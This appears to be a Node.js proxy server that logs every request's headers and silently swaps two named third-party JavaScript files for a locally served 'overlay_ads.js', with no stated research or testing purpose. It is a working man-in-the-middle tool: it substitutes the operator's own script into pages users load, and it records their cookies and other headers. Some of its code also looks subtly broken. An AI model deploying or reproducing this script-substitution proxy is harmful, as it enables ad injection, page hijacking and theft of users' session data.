var http = require('http');
var request = require('request');
var static = require('node-static');


const
    OVERLAY_JAVASCRIPT = 'http://localhost:8080/overlay_ads.js',
    OVERLAY_ADS_URLS = [
        'http://bxss.s3.amazonaws.com/ad.js',
        'http://businesscorp.com.br/js/jquery-migrate-1.2.1.min.js'
    ];

/**
 * @param {ServerResponse} res
 * @param {IncomingMessage} req
 */
http.createServer(function(req, res) {

    var reqHeaders = req.headers;
    var reqPath = req.url;
    var reqUrl = reqPath;
    var reqMethod = req.method;

    console.log("Proxy URL:" + reqUrl);
    console.log("Proxy Headers:" + JSON.stringify(reqHeaders));
    console.log("Proxy Method:" + reqMethod);
    console.log("Proxy HTTP Ver:" + req.httpVersion);

    OVERLAY_ADS_URLS.forEach((item, index, arr) => {
        if (reqUrl.indexOf(item) != -1) {
            reqUrl = OVERLAY_JAVASCRIPT;
        }
    });

    var proxyReq = request({
        uri: reqUrl,
        method: reqMethod,
        headers: [reqHeaders],
    });

    proxyReq.on('error', e => {
        res.end();
    });

    var respEvent = proxyReq.on('response', proxyResponse => {

    })

    respEvent.pipe(res)

}).listen(80);

var file = new(static.Server)('assets');
http.createServer(function(req, res) {
    file.serve(req, res);
}).listen(8080);